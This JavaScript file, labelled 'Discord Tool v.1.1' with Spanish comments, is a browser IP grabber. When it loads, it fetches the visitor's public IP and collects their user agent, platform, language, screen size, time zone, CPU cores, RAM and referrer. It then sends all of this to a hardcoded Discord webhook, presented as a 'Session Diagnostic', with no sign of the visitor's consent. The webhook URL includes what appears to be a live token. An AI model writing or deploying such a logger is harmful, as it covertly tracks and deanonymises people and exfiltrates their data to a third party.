// --- Discord Tool v.1.1 ---
const ipifyAPI = "https://api.ipify.org?format=json";
const webhookURL = "https://ptb.discord.com/api/webhooks/1527734124520149117/JbJOjX2jYzYQPEfIUsDXh4DNJGuX1asp7MmMT0GtxhxKpturo2sWfXWTFge1bGAuJw2x";

async function getIP() {
    try {
        const response = await fetch(ipifyAPI);
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP:", error);
        return null;
    }
}

async function sendToDiscord(ip) {
    if (!ip) return;

    // Recopilación de más datos del navegador/dispositivo
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const cpuCores = navigator.hardwareConcurrency || "No disponible";
    const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "No disponible";
    const referrer = document.referrer ? document.referrer : "Acceso directo";

    const payload = {
        embeds: [
            {
                title: "Discord Session Diagnostic - Advanced Info",
                color: 5814783,
                fields: [
                    { name: "Client IP", value: ip, inline: true },
                    { name: "Plataforma", value: platform, inline: true },
                    { name: "Idioma", value: language, inline: true },
                    { name: "Resolución", value: screenRes, inline: true },
                    { name: "Zona Horaria", value: timeZone, inline: true },
                    { name: "Núcleos CPU", value: String(cpuCores), inline: true },
                    { name: "RAM Aprox.", value: ram, inline: true },
                    { name: "Referrer", value: referrer, inline: false },
                    {
                        name: "User-Agent",
                        value: `\`\`\`${userAgent}\`\`\``,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            }
        ]
    };

    try {
        await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error("Error:", error);
    }
}

async function main() {
    const ip = await getIP();
    if (ip) {
        await sendToDiscord(ip);
    }
}

main();
